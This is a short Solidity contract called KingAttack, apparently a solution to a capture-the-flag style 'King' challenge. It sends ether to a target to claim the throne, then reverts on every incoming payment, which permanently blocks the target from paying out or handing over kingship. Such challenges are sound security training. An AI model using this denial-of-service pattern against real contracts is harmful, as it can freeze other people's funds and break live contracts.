// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address _address) payable {
        (bool valid,) = _address.call{value: msg.value}("");
        require(valid, "failed to become king");
    }

    receive() external payable {
        revert();
    }
}